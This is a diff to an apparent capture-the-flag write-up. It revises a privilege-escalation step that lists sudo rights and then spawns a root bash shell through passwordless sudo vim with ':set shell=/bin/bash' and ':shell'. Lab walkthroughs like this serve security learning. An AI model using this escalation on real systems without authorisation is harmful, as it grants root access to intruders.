@@ -19,8 +19,7 @@ by Migue27au
 	2.5. Get user flag --> cat ~/user.txt
 3. Privilege Scalation
 	3.1. Look privileges --> sudo -l
-
-	3.2. vim allow without password
+	3.2. vim allow without password. We need to execute a /bin/bash with sudo privileges in vim
 		- sudo vim
 		- :set shell=/bin/bash
 		- :shell
